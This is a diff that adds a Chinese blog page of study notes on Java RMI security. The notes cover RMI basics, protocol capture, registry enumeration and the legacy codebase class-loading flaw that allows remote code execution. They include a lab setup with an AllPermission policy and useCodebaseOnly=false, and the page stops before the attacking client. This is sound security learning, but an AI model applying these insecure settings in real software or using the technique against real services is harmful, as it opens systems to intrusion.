@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这是JAVA安全漫谈学习记录的RMI篇。这里学习一下RMI，后面会学习到RMI 配合JNDILDAP配合JNDI的使用。 RMI全称Remote Method Invocation，远程方法调用。作用是让java虚拟机上的对象调用另一个java虚拟机上的方法RMI是java独有的一种机制，这里用p牛写的一个小例子开始演示RMI的流程先是RMI Server端 1234567891011121314">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全漫谈-RMI篇">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;11&#x2F;10&#x2F;java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="这是JAVA安全漫谈学习记录的RMI篇。这里学习一下RMI，后面会学习到RMI 配合JNDILDAP配合JNDI的使用。 RMI全称Remote Method Invocation，远程方法调用。作用是让java虚拟机上的对象调用另一个java虚拟机上的方法RMI是java独有的一种机制，这里用p牛写的一个小例子开始演示RMI的流程先是RMI Server端 1234567891011121314">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;10&#x2F;E72z6VWRJr9seTg.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;10&#x2F;tyur63JSckZQjfg.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;tybRO5e61ADVmov.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;3xKRs6FULtnYudA.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;pWwn95vC6QJxq8H.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;koRQ6hwF5YZfnea.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;81YEaLQqv9UDIBk.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;TlYbmfHyOkh8soL.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;Am8vxTgXlRonF63.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;JoOg1MFE5yvZClY.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;NrMO5xfaq1pXlKc.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;Az39ahBPcTVJbDQ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;jZRwbJSnrLVkiQA.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;Z8zBGaRurH7lqiE.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;11&#x2F;fibZDVAgU4P1Nop.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;12&#x2F;ts2IlkYDHpaMS81.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;12&#x2F;OU6fKy5Tshm7Nit.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;12&#x2F;9ZvG1pO3Eihy57B.png">
+<meta property="og:updated_time" content="2021-11-12T05:57:42.098Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;10&#x2F;E72z6VWRJr9seTg.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/11/10/java安全漫谈-RMI篇/"/>
+
+
+
+
+
+  <title>java安全漫谈-RMI篇 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/11/10/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-RMI%E7%AF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">java安全漫谈-RMI篇</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-11-10T12:28:04+08:00">
+                2021-11-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.5k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  18
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这是JAVA安全漫谈学习记录的RMI篇。这里学习一下RMI，后面会学习到RMI 配合JNDI<br>LDAP配合JNDI的使用。</p>
+<p>RMI全称Remote Method Invocation，远程方法调用。作用是让java虚拟机上的对象调用另一个java虚拟机上的方法<br>RMI是java独有的一种机制，这里用p牛写的一个小例子开始演示RMI的流程<br>先是RMI Server端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span></span></span><br><span class="line"><span class="class">            <span class="title">IRemoteHelloWorld</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"call from"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Hello world"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RemoteHelloWorld h = <span class="keyword">new</span> RemoteHelloWorld();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里和后续会写到的JNDI配合RMI会有一些相似的地方。后面写到的时候可以对比下。<br>一个RMIServer简单分成三部分</p>
+<ol>
+<li>一个继承了java.rmi.Remote的接口，其中定义了提供给远程调用的方法。比如上面的hello()</li>
+<li>一个实现了这个接口的类。这里是RemoteHelloWorld</li>
+<li>一个主类，用来创建Registry，并将上面的类实例化后绑定到一个地址，这就是所谓的Server<br>这里的例子把三个东西都放一个类里面了，在类里面定义了内部类。</li>
+</ol>
+<p>接下来编写一个简单的客户端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> RMIServer;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>);</span><br><span class="line">        String ret = hello.hello();</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>客户端就比较简单。直接使用Naming.lookup在Registry里面找名字是Hello的对象，后面使用就和在本地一样<br>执行远程方法的时候，<strong>代码是在远程服务器执行的</strong>，但是还是需要知道有哪些方法可以执行，这时候就体现出接口的重要性了<br>这就是为什么前面要继承Remote接口，并将我们需要调用的方法写在接口IRemoteHelloWorld里，因为客户端也需要用到这个接口。</p>
+<p>为了理解RMI执行流程，这里用wireshark抓包(因为我没开虚拟机。这里直接用p牛的图)<br><img src="https://i.loli.net/2021/11/10/E72z6VWRJr9seTg.png" alt="1.png"><br>整个完整通信过程中，进行了两次TCP的握手，也就是说进行了两次tcp连接<br>第一次连接访问了远程192.168.135.142的1099.也是我们写在RMIServer代码里的端口。二者进行沟通，随后的RMI协议中<br>客户端发出了一个Call消息。然后服务端返回了一个ReturnData消息。<br>再然后客户端就区重新连接192.168.135.142的33769端口了。为什么会重连33769端口？<br>仔细阅读ReturnData这个包，会发现返回了服务端地址192.168.135.142这个地址，并且后面跟了一个字节<code>\x00\x00\x83\xE9</code><br>这就是33769网络序列。<br><img src="https://i.loli.net/2021/11/10/tyur63JSckZQjfg.png" alt="1.png"><br>其实从前面的aced开始就是java的反序列化数据了。IP和端口只是这个对象的一部分。<br>梳理一下这个流程，客户端连接Registry，寻找其中Name是Hello的对象，这个对于数据流中Call消息。<br>然后Registry返回一个序列化的数据，这个就是找到的Name=Hello的对象。对应数据流中的ReturnData消息。<br>客户端反序列化名为Hello的对象，发现这是一个远程对象，地址在192.168.135.142:33769,于是再与这个地址建立TCP连接；<br>在这个新连接中才执行真正的远程调用。<br>远程⽅法实际上在RMI Server上调⽤，结果返回给客户端</p>
+<p>上面的例子中，RMI通信主要有三个参与者RMIServer，RMIClient，RMI Registry<br>但是为什么示例代码只写了一个客户端一个服务端。这是因为Registry通常包含在服务端之中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">"rmi://127.0.0.1:1099/Hello"</span>,<span class="keyword">new</span> RemoteHelloWorld());</span><br></pre></td></tr></table></figure>
+<p>第一行创建并运行Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上<br>bind的第一个参数是一个URL，类似<code>rmi://host:post/name</code>,其中，host和port就是RMI Registry的地址和端口<br>name是远程对象的名字。如果运行在本地，那么host和post是可以省略的，此时host默认localhost，port默认1099</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naming.bind(<span class="string">"Hello"</span>, <span class="keyword">new</span> RemoteHelloWorld());</span><br></pre></td></tr></table></figure>
+<ol>
+<li>这里思考两个问题，如果能访问RMI Registry，如何对其进行攻击？</li>
+<li>如果我们控制了目标RMI客户端中的Naming.lookup的第一个参数(也就是RMI Registry的地址)，能不能对服务端进行攻击？</li>
+</ol>
+<p>首先回答第一个问题，当我们能访问目标RMI Registry的时候，会有哪些安全问题<br>RMI Register是一个远程管理对象的地方，可以理解为一个远程对象的“后台”，我们可以尝试直接访问“后台”功能<br>比如修改远程服务器上Hello对应的对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RemoteHelloWorld h = <span class="keyword">new</span> RemoteHelloWorld();</span><br><span class="line">Naming.rebind(<span class="string">"rmi://192.168.135.142/Hello"</span>, h);</span><br></pre></td></tr></table></figure>
+<p>尝试修改RMI Registry绑定的对象为我们在客户端新建的h。但是这样会报错，因为Java对远程访问RMI Register做了限制。<br>只有来源地址是localhost的时候，才能调用rebind，bind，unbind等方法。<br>但是在客户端可以调用list和lookup。list可以列出目标上所有绑定对象</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] s = Naming.list(<span class="string">"rmi://192.168.135.142:1099"</span>);</span><br></pre></td></tr></table></figure>
+<p>lookup的作用就是获取某个远程对象。如果目标服务器存在一些危险方法，我们就可以通过RMI对其进行调用。<br>当然，RMI能做到的事不会只是这样没营养的。<br>接下来来了解一些远古时期的漏洞。在Applet时期，java是可以运行在浏览器里面的，使用Applet的时候需要指定一个<br>codebase属性，比如</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;applet&gt; code = "Helloworld.class" codebase="Applets" width="800" height="600"&gt;&lt;/applet&gt;</span><br></pre></td></tr></table></figure>
+<p>除了applet，RMI中也存在远程加载的场景，也会涉及到codebase<br>codebase是一个地址，告诉java虚拟机应该从哪里去搜索类，类似日常用的CLASSPATH，但CLASSPATH是本地路径<br>而codebase通常是远程URL，比如http，ftp等。<br>如果指定<code>codebase=http://example.com/</code>，然后加载org.vulhub.example.Example类，那么虚拟机会下载<br><code>http://example.com/org/vulhub/example/Example.class</code>，并作为Example类的字节码。<br>在RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。<br>如果某一端反序列化时发现一个对象，就会去自己的CLASSPATH下寻找对应的类<br><strong>如果在本地没有找到这个类，那么就会去加载codebase中的类</strong><br>到这里就发现，如果codebase被控制，那么我们不就可以加载恶意类了吗？<br>而在RMI中，是可以将codebase随着序列号数据一起传输的，服务器在接收到这个数据后就会去对CLASSPATH和指定的codebase寻找类。<br>由于codebase被控制，导致任意命令执行漏洞。<br>官方当然对这个漏洞做出了修补，所以目前只有满足如下条件的RMI服务器会被攻击：</p>
+<ol>
+<li>安装并且配置了SecurityManager</li>
+<li>java版本低于7u21，6u45，或者设置了java.rmi.server.useCodebaseOnly=false,官方在这之后的版本中将java.rmi.server.useCodebaseOnly的默认值<br>从false改为了true。在配置为true的情况下，java虚拟机只信任预先配置好的codebase，不再支持从RMI请求中获取<br>这里利用p牛编写的代码复现一下漏洞。首先是RMIServer的代码,分四个文件。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICalc</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ICalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    Integer sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">        sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"setup SecurityManager"</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> SecurityManager());</span><br><span class="line">        &#125;</span><br><span class="line">        Calc h = <span class="keyword">new</span> Calc();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">"refObj"</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> RemoteRMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// client.policy</span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+这里分开写成四个文件<br>文件名写开头注释的文件名就好了，文件的结构如下<br><img src="https://i.loli.net/2021/11/11/tybRO5e61ADVmov.png" alt="1.png"><br>编译运行：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer</span><br></pre></td></tr></table></figure>
+这里java.rmi.server.host是服务器的ip地址。由于我本地复现服务端客户端都没开虚拟机，改为了127.0.0.1</li>
+</ol>
+<p><strong>这里记录一下踩坑</strong>，因为我本地安装了不止一个jdk，而且由于我对java不太熟悉，所以我的设置上出了一些问题。<br>在尝试运行上面两条命令的时候，出现了错误，提示<code>A JNI error has occurred, please check your installation and try again</code><br>在 <a href="https://stackoverflow.com/questions/22381202/a-jni-error-has-occurred-please-check-your-installation-and-try-again-in-eclips" target="_blank" rel="noopener">传送门</a>找到了解决办法<br>当我在cmd运行java -version 得到的结果是1.8_0_202<br>当我在cmd运行javac -version 等到的是15，也就是说我用了更高版本的java去编译，而用了低版本的java去尝试运行java.class文件，导致出现了错误<br>在漫长的环境配置之后，继续我们的复现。还是运行刚才的两条命令<br>执行第二条指令的时候，可以看到终端输出了setup SecurityManager的字样。这样RMIServer就算是运行起来了。</p>
+<p>接下来建立一个RMIClient，写成两个文件的形式。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RMIClient</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span 